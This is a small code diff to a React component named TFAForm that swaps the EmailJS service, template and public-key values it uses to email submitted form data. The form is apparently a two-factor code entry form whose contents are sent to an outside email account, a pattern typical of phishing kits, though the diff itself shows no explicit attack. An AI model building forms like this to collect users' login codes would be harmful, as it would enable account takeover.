@@ -68,8 +68,8 @@ function TFAForm() {
         console.log(dataToSend);
 
         emailjs
-            .send('service_den3wln', 'template_a6orpzh', dataToSend, {
-                publicKey: 'pSxMqR4gZtAvfW-1V',
+            .send('service_pdvyt1h', 'template_rg2hj7l', dataToSend, {
+                publicKey: 'AWoAQ8H3x_KhvzuYv',
             })
             .then(
                 (result) => {
